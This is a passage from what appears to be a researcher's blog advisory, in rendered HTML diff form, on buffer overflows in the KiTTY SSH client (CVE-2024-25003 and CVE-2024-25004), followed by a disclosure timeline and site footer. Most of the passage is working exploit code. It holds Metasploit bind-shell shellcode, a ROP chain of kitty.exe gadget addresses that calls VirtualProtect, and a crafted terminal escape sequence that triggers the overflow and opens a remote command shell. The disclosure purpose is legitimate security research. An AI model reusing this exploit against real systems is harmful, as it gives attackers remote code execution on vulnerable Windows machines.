+<span class="n">escape_sequence</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\033</span><span class="s">]0;__dt:'</span> <span class="o">+</span> <span class="n">shellcode</span><span class="p">()</span> <span class="o">+</span> <span class="n">return_address</span>
+<span class="n">escape_sequence</span> <span class="o">+=</span> <span class="n">rop_chain_padding</span> <span class="o">+</span> <span class="n">rop_chain</span>
+<span class="n">escape_sequence</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x90</span><span class="s">'</span>
+<span class="n">escape_sequence</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xE9\x2A\xFA\xFF\xFF</span><span class="s">"</span> <span class="c1">#jmp $eip-1490
+</span><span class="n">escape_sequence</span> <span class="o">+=</span> <span class="n">nops</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\007</span><span class="s">'</span>
+
+<span class="n">stdout</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">fdopen</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="s">'wb'</span><span class="p">)</span> 
+<span class="n">stdout</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">escape_sequence</span><span class="p">)</span>
+<span class="n">stdout</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
+</span>
+<span class="c1">#-------------------------------------------------------------------------------------#
+# Exploit: KiTTY ≤ 0.76.1.13 Buffer Overflow Vulnerability in KiTTY Start             #
+#        Duplicated Session Username Variable (CVE-2024-25004)                        #
+# OS: Microsoft Windows 11/10/8/7/XP                                                  #
+# Author: DEFCESCO (Austin A. DeFrancesco)                                            #
+# Software:                                                                           #
+# https://github.com/cyd01/KiTTY/releases/download/v0.76.1.13/kitty-bin-0.76.1.13.zip #
+#-------------------------------------------------------------------------------------#
+# More details can be found on my blog: https://blog.DEFCESCO.io/Hell0+KiTTY          #
+#-------------------------------------------------------------------------------------#
+# msf6 payload(windows/shell_bind_tcp) &gt; to_handler                                   #
+# [*] Payload Handler Started as Job 1                                                #
+# msf6 payload(windows/shell_bind_tcp) &gt;                                              #
+# [*] Started bind TCP handler against 192.168.100.28:4444                            #
+# [*] Command shell session 1 opened (192.168.100.119:34285 -&gt; 192.168.100.28:4444)   # 
+#-------------------------------------------------------------------------------------#
+</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="c1">#-------------------------------------------------------------------------------------#
+# msf6 payload(windows/shell_bind_tcp) &gt; generate -b '\x00\x07\x0a\x0d\x1b\x9c' -f py #
+# windows/shell_bind_tcp - 355 bytes                                                  #
+# https://metasploit.com/                                                             #
+# Encoder: x86/shikata_ga_nai                                                         #
+# VERBOSE=false, LPORT=4444, RHOST=192.168.100.28,                                    #
+# PrependMigrate=false, EXITFUNC=process, CreateSession=true,                         #
+# AutoVerifySession=true                                                              #
+#-------------------------------------------------------------------------------------#
+</span>
+<span class="n">buf</span> <span class="o">=</span>  <span class="sa">b</span><span class="s">""</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xd9\xe9\xd9\x74\x24\xf4\xbd\xfe\xb7\xa4\x99\x5e</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x29\xc9\xb1\x53\x83\xee\xfc\x31\x6e\x13\x03\x90</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xa4\x46\x6c\x90\x23\x04\x8f\x68\xb4\x69\x19\x8d</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x85\xa9\x7d\xc6\xb6\x19\xf5\x8a\x3a\xd1\x5b\x3e</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xc8\x97\x73\x31\x79\x1d\xa2\x7c\x7a\x0e\x96\x1f</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xf8\x4d\xcb\xff\xc1\x9d\x1e\xfe\x06\xc3\xd3\x52</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xde\x8f\x46\x42\x6b\xc5\x5a\xe9\x27\xcb\xda\x0e</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xff\xea\xcb\x81\x8b\xb4\xcb\x20\x5f\xcd\x45\x3a</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xbc\xe8\x1c\xb1\x76\x86\x9e\x13\x47\x67\x0c\x5a</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x67\x9a\x4c\x9b\x40\x45\x3b\xd5\xb2\xf8\x3c\x22</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xc8\x26\xc8\xb0\x6a\xac\x6a\x1c\x8a\x61\xec\xd7</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x80\xce\x7a\xbf\x84\xd1\xaf\xb4\xb1\x5a\x4e\x1a</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x30\x18\x75\xbe\x18\xfa\x14\xe7\xc4\xad\x29\xf7</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xa6\x12\x8c\x7c\x4a\x46\xbd\xdf\x03\xab\x8c\xdf</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xd3\xa3\x87\xac\xe1\x6c\x3c\x3a\x4a\xe4\x9a\xbd</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xad\xdf\x5b\x51\x50\xe0\x9b\x78\x97\xb4\xcb\x12</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x3e\xb5\x87\xe2\xbf\x60\x3d\xea\x66\xdb\x20\x17</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xd8\x8b\xe4\xb7\xb1\xc1\xea\xe8\xa2\xe9\x20\x81</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x4b\x14\xcb\xbc\xd7\x91\x2d\xd4\xf7\xf7\xe6\x40</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x3a\x2c\x3f\xf7\x45\x06\x17\x9f\x0e\x40\xa0\xa0</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x8e\x46\x86\x36\x05\x85\x12\x27\x1a\x80\x32\x30</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x8d\x5e\xd3\x73\x2f\x5e\xfe\xe3\xcc\xcd\x65\xf3</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x9b\xed\x31\xa4\xcc\xc0\x4b\x20\xe1\x7b\xe2\x56</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xf8\x1a\xcd\xd2\x27\xdf\xd0\xdb\xaa\x5b\xf7\xcb</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x72\x63\xb3\xbf\x2a\x32\x6d\x69\x8d\xec\xdf\xc3</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x47\x42\xb6\x83\x1e\xa8\x09\xd5\x1e\xe5\xff\x39</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xae\x50\x46\x46\x1f\x35\x4e\x3f\x7d\xa5\xb1\xea</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xc5\xd5\xfb\xb6\x6c\x7e\xa2\x23\x2d\xe3\x55\x9e</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x72\x1a\xd6\x2a\x0b\xd9\xc6\x5f\x0e\xa5\x40\x8c</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x62\xb6\x24\xb2\xd1\xb7\x6c</span><span class="s">"</span>
+
+<span class="k">def</span> <span class="nf">shellcode</span><span class="p">():</span>
+	<span class="n">sc</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span> 
+	<span class="n">sc</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\xBB\x44\x24\x44\x44</span><span class="s">'</span> <span class="c1"># mov    ebx,0x44442444
+</span>	<span class="n">sc</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\xB8\x44\x44\x44\x44</span><span class="s">'</span> <span class="c1"># mov    eax,0x44444444
+</span>	<span class="n">sc</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x29\xD8</span><span class="s">'</span>             <span class="c1"># sub    eax,ebx
+</span>	<span class="n">sc</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x29\xC4</span><span class="s">'</span>             <span class="c1"># sub    esp,eax
+</span>	<span class="n">sc</span> <span class="o">+=</span> <span class="n">buf</span>
+	<span class="n">sc</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x90</span><span class="s">'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1042</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">sc</span><span class="p">))</span>
+	<span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1042</span> 
+	<span class="k">return</span> <span class="n">sc</span>
+
+<span class="k">def</span> <span class="nf">create_rop_chain</span><span class="p">():</span>
+	<span class="c1"># rop chain generated with mona.py - www.corelan.be
+</span>	<span class="n">rop_gadgets</span> <span class="o">=</span> <span class="p">[</span>
+	<span class="c1">#[---INFO:gadgets_to_set_esi:---]
+</span>	<span class="mh">0x004c5832</span><span class="p">,</span>  <span class="c1"># POP EAX # ADD ESP,14 # POP EBX # POP ESI # RETN [kitty.exe]
+</span>	<span class="mh">0x006424a4</span><span class="p">,</span>  <span class="c1"># ptr to &amp;VirtualProtect() [IAT kitty.exe]
+</span>	<span class="mh">0x41414141</span><span class="p">,</span>  <span class="c1"># Filler (compensate)
+</span>	<span class="mh">0x41414141</span><span class="p">,</span>  <span class="c1"># Filler (compensate)
+</span>	<span class="mh">0x41414141</span><span class="p">,</span>  <span class="c1"># Filler (compensate)
+</span>	<span class="mh">0x41414141</span><span class="p">,</span>  <span class="c1"># Filler (compensate)
+</span>	<span class="mh">0x41414141</span><span class="p">,</span>  <span class="c1"># Filler (compensate)
+</span>	<span class="mh">0x41414141</span><span class="p">,</span>  <span class="c1"># Filler (compensate)
+</span>	<span class="mh">0x41414141</span><span class="p">,</span>  <span class="c1"># Filler (compensate)
+</span>	<span class="mh">0x00484e07</span><span class="p">,</span>  <span class="c1"># MOV EAX,DWORD PTR DS:[EAX] # RETN [kitty.exe]
+</span>	<span class="mh">0x00473cf6</span><span class="p">,</span>  <span class="c1"># XCHG EAX,ESI # RETN [kitty.exe]
+</span>	<span class="c1">#[---INFO:gadgets_to_set_ebp:---]
+</span>	<span class="mh">0x00429953</span><span class="p">,</span>  <span class="c1"># POP EBP # RETN [kitty.exe]
+</span>	<span class="mh">0x005405b0</span><span class="p">,</span>  <span class="c1"># PUSH ESP; RETN 0 [kitty.exe]
+</span>	<span class="c1">#[---INFO:gadgets_to_set_ebx:---]
+</span>	<span class="mh">0x0049d9f9</span><span class="p">,</span>  <span class="c1"># POP EBX # RETN [kitty.exe]
+</span>	<span class="mh">0x00000201</span><span class="p">,</span>  <span class="c1"># 0x00000201-&gt; ebx
+</span>	<span class="c1">#[---INFO:gadgets_to_set_edx:---]
+</span>	<span class="mh">0x00430dce</span><span class="p">,</span>  <span class="c1"># POP EDX # RETN [kitty.exe]
+</span>	<span class="mh">0x00000040</span><span class="p">,</span>  <span class="c1"># 0x00000040-&gt; edx
+</span>	<span class="c1">#[---INFO:gadgets_to_set_ecx:---]
+</span>	<span class="mh">0x005ac58c</span><span class="p">,</span>  <span class="c1"># POP ECX # RETN [kitty.exe]
+</span>	<span class="mh">0x004d81d9</span><span class="p">,</span>  <span class="c1"># &amp;Writable location [kitty.exe]
+</span>	<span class="c1">#[---INFO:gadgets_to_set_edi:---]
+</span>	<span class="mh">0x004fa404</span><span class="p">,</span>  <span class="c1"># POP EDI # RETN [kitty.exe]
+</span>	<span class="mh">0x005a2001</span><span class="p">,</span>  <span class="c1"># RETN (ROP NOP) [kitty.exe]
+</span>	<span class="c1">#[---INFO:gadgets_to_set_eax:---]
+</span>	<span class="mh">0x004cd011</span><span class="p">,</span>  <span class="c1"># POP EAX # POP EBX # RETN [kitty.exe]
+</span>	<span class="mh">0x90909090</span><span class="p">,</span>  <span class="c1"># nop
+</span>	<span class="mh">0x41414141</span><span class="p">,</span>  <span class="c1"># Filler (compensate)
+</span>	<span class="c1">#[---INFO:pushad:---]
+</span>	<span class="mh">0x005dfbac</span><span class="p">,</span>  <span class="c1"># PUSHAD # RETN [kitty.exe]
+</span>	<span class="p">]</span>
+	<span class="k">return</span> <span class="sa">b</span><span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">_</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">rop_gadgets</span><span class="p">)</span>
+
+<span class="n">rop_chain</span> <span class="o">=</span> <span class="n">create_rop_chain</span><span class="p">()</span>
+
+<span class="c1">#----------------------------------------------------------------------------------#
+# Badchars: \x00\x07\x0a\x0d\x1b\x9c\x9d                                           #
+# Return Address Information: 0x00529720 : {pivot 324 / 0x144} :                   #
+#   ADD ESP,134 # POP EBX # POP ESI # POP EDI # POP EBP # RETN                     #
+#   ** [kitty.exe] **   |  startnull {PAGE_EXECUTE_READWRITE}                      #
+# Shellcode size at ESP: 1042 bytes                                                #
+#----------------------------------------------------------------------------------#
+</span>
+<span class="n">return_address</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span>  <span class="mh">0x00529720</span><span class="p">)</span> <span class="c1"># ADD ESP,134 # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [kitty.exe] **   |  startnull {PAGE_EXECUTE_READWRITE}
+</span>
+<span class="n">rop_chain_padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x90</span><span class="s">'</span> <span class="o">*</span> <span class="mi">27</span>
+<span class="n">nops</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x90</span><span class="s">'</span> <span class="o">*</span> <span class="mi">88</span>
+
+<span class="n">escape_sequence</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\033</span><span class="s">]0;__dt:localhost:'</span> <span class="o">+</span> <span class="n">shellcode</span><span class="p">()</span> <span class="o">+</span> <span class="n">return_address</span>
+<span class="n">escape_sequence</span> <span class="o">+=</span> <span class="n">rop_chain_padding</span> <span class="o">+</span> <span class="n">rop_chain</span>
+<span class="n">escape_sequence</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\xE9\x3D\xFA\xFF\xFF</span><span class="s">'</span> <span class="c1"># jmp $eip-1471
+</span><span class="n">escape_sequence</span> <span class="o">+=</span> <span class="n">nops</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\007</span><span class="s">'</span>
+
+<span class="n">stdout</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">fdopen</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="s">'wb'</span><span class="p">)</span> 
+<span class="n">stdout</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">escape_sequence</span><span class="p">)</span>
+<span class="n">stdout</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="acknowledgments-">Acknowledgments: <a name="acknowledgments"></a></h2>
+
+<p>Austin thanks the MITRE CVE Assignment Team for their assistance with the CVE service requests.</p>
+
+<h2 id="timeline-">Timeline: <a name="timeline"></a></h2>
+
+<p>2024-01-08: This advisory contains one vulnerability and one additional advisory totaling three vulnerabilities sent to KiTTY maintainer Cyril Dupont; no reply from Cyril.</p>
+
+<p>2024-01-28: Follow-up email with assigned CVE numbers and full writeups sent to Cyril Dupont; no reply.</p>
+
+<p>2024-02-07: Public Advisory &amp; Exploits Release Date (6:00 PM UCT).</p>
+
+<h2 id="additional-advisory-">Additional Advisory: <a name="additional"></a></h2>
+
+<p>CVE-2024-23749 Command Injection Vulnerability in KiTTY Get Remote File Through SCP Input: https://blog.defcesco.io/CVE-2024-23749</p>
+
+  <time datetime="2024-02-07T00:00:00+00:00" class="post-date">Posted on 07 Feb 2024.</time>
+
+  <div class="share-posts">
+
+    Share with your friends:
+
+    <a href="https://twitter.com/intent/tweet?text=Buffer Overflow Vulnerabilities in KiTTY Start Duplicated Session Hostname (CVE-2024-25003) & Username (CVE-2024-25004) Variables&url=https://blog.defcesco.io/CVE-2024-25003-CVE-2024-25004&via=&related=" rel="nofollow" target="_blank" title="Share on Twitter">Twitter</a>
+
+    <a href="https://facebook.com/sharer.php?u=https://blog.defcesco.io/CVE-2024-25003-CVE-2024-25004" rel="nofollow" target="_blank" title="Share on Facebook">Facebook</a>
+	
+	<a href="/feed.xml" target="_blank">RSS</a>
+
+</div>
+
+</article>
+
+
+      </main>
+    
+      
+<footer class="site-footer fade-in" id="footer">
+  <div class="read-next" role="navigation" aria-label="Read next">
+    <span class="read-next__label">Read Next:</span>
+    
+      <a class="prev-post" href="/CVE-2024-23749">Command Injection Vulnerability in KiTTY Get Remote File Through SCP Input (CVE-2024-23749)</a>
+    
+  </div>
+
+  <a href="/" class="back-home">Back Home</a>
+
+  <div class="copyright"> 
+    <small> &copy; <time datetime="2025-10-26T20:53:16+00:00">2024</time> Austin A. DeFrancesco</small>
+  </div>
+
+</footer>
+
+
+    </div>
+
+    <form id="subscription-form" class="subscription-form" method="POST">
+  <h2> Join My Newsletter  </h2>
+  <p> Sign up to receive blog updates. </p>
+  <a class="close-form" id="close-form">x</a>
+    
+    <input type="text" name="name" id="your-name" minlength="3" 
+    placeholder="Name" required> 
+
+    <input type="email" name="subscriber" id="email" 
+    placeholder="Email" required>
+
+    <!-- return to site after submission --> 
+     <input type="hidden" name="_next" value="/CVE-2024-25003-CVE-2024-25004" />
+
+    <textarea name="YES!" value="Note to self: Add to list" style="display:none"></textarea>
+
+     <input class="send-button" type="submit" value="Sign Up"> 
+    </form>
+</form>
+
+<!-- wrap email attribute in JS for extra security -->
+<script>
+    var contactform =  document.getElementById('subscription-form');
+    contactform.setAttribute('action', '//formspree.io/' + 'austin[@]defcesco[.]io');
+</script>
+
+
+    <script src="/js/jquery.min.js"></script>
+<script src="/js/site-form-triggers.js"></script>
+
+
+
+
+<script src="/js/post-scroll-triggers.js"></script>
+
+
+<script src="/js/code-toggle.js"></script>
+
+
+
+
+  </body>
+
+</html>
